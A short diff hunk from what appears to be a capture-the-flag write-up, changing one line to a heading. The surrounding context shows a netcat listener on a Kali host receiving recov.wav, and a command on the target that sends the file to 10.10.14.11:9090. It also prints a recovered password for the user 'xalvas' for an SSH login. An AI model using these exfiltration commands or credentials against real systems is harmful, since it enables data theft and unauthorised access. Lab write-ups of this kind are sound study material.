@@ -34,9 +34,7 @@ Kali: nc  -l -p 9090 > recov.wav
 Remote:./nba -w3 10.10.14.11 9090 < recov.wav
 --------------------------------------------------------
 ```
-
-
-Then know "xalvas" password and login SSH:
+#### Then know "xalvas" password and login SSH:
 18547936..*
 Kail:
 ```shell
